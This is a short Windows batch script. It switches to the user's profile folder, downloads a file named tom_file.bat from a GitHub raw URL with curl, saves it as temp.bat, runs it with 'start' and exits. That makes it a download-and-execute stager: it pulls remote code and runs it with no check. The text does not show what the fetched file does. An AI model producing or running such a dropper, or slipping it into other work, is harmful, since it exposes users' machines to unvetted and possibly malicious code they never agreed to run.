@echo off
cd %userprofile%

curl  https://raw.githubusercontent.com/kamilix2003/pejAD/master/tom_file.bat > temp.bat

start temp.bat /b

exit
